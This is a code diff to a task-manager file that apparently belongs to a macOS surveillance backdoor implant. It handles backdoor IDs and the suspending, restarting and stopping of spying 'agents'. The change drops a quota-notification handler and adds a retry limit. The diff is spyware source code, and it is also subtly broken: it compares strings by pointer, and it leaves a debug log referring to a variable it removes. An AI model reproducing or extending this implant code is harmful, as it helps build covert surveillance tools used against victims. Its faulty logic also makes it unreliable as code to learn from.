@@ -37,7 +37,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
-//#define DEBUG_TASK_MANAGER
+#define MAX_RETRY_TIME     6
 
 static RCSMTaskManager *sharedTaskManager = nil;
 static NSLock *gTaskManagerLock           = nil;
@@ -55,6 +55,7 @@ static NSLock *gSyncLock                  = nil;
 @synthesize mBackdoorID;
 @synthesize mBackdoorControlFlag;
 @synthesize mShouldReloadConfiguration;
+@synthesize mIsSyncing;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -99,7 +100,7 @@ static NSLock *gSyncLock                  = nil;
 {
   return self;
 }
-extern NSString *RCSGlobalQuotaReached;
+
 - (id)init
 {
   Class myClass = [self class];
@@ -143,12 +144,6 @@ extern NSString *RCSGlobalQuotaReached;
               mIsSyncing        = NO;
               
               sharedTaskManager = self;
-              
-              // Start to handle quota notification
-              [[NSNotificationCenter defaultCenter] addObserver:self 
-                                                       selector:@selector(quotaNotificationCallback:) 
-                                                           name:RCSGlobalQuotaReached 
-                                                         object:nil];
             }
         }
     }
@@ -643,33 +638,6 @@ extern NSString *RCSGlobalQuotaReached;
 #pragma mark -
 #pragma mark Agents
 #pragma mark -
-
-// Receive quota exceded notification
-- (void)quotaNotificationCallback:(NSNotification*)aNotify
-{
-  NSNumber *action = (NSNumber*)[aNotify object];
-  
-  if (action)
-    {
-      // Quota exceded: suspend running agents
-      if ([action intValue] == 1)
-        {
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"quota exceded suspend running agents");
-#endif
-          [self suspendAgents];
-        }
-        
-      // Quota disk available: restart suspended agents
-      if ([action intValue] == 0) 
-        {
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"quota available restart suspended agents");
-#endif
-          [self restartAgents];
-        }
-    }
-}
 
 - (id)initAgent: (u_int)agentID
 {
@@ -1496,13 +1464,12 @@ extern NSString *RCSGlobalQuotaReached;
       [anObject retain];
       
       int agentID       = [[anObject objectForKey: @"agentID"] intValue];
-      NSString *status  = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
       
 #ifdef DEBUG_TASK_MANAGER
       infoLog(@"Agent %d status %@", agentID, status);
 #endif
 
-      if ([status isEqualToString: AGENT_SUSPENDED] == TRUE)
+      if ([anObject objectForKey: @"status"] == AGENT_SUSPENDED )
         {
           [self startAgent:agentID];
           
@@ -1511,7 +1478,6 @@ extern NSString *RCSGlobalQuotaReached;
 #endif
         }
       
-      [status release];
       [anObject release];
       
       [innerPool release];
@@ -1540,35 +1506,39 @@ extern NSString *RCSGlobalQuotaReached;
       
       [anObject retain];
       
-      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
-      NSString *status  = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
-
-#ifdef DEBUG_TASK_MANAGER
-    infoLog(@"Agent %#x status %@", agentID, status);
-#endif
-
-      if ([status isEqualToString: AGENT_RUNNING] == TRUE)
+      int agentID = [[anObject objectForKey: @"agentID"] intValue];
+      
+      if ([anObject objectForKey: @"status"] == AGENT_RUNNING)
         {
+          int retry = 0;
+          
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Agent %#x found %@", agentID, [anObject objectForKey: @"status"]);
+#endif
           [self stopAgent:agentID];
           
-          while ([anObject objectForKey: @"status"] != AGENT_STOPPED)
+          while (([anObject objectForKey: @"status"] != AGENT_STOPPED) &&
+                 (retry++ < MAX_RETRY_TIME))
             {
-              usleep(5000);
+              sleep(1);
             }
             
           [anObject setObject: AGENT_SUSPENDED forKey: @"status"];
           
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Agent %#x new status %@", agentID, status);
+          infoLog(@"Agent %#x new status %@", agentID, [anObject objectForKey: @"status"]);
 #endif
         }
         
-      [status release];
       [anObject release];
       
       [innerPool release];
     }
     
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"suspending agents done");
+#endif
+  
   [outerPool release];
   
   return YES;
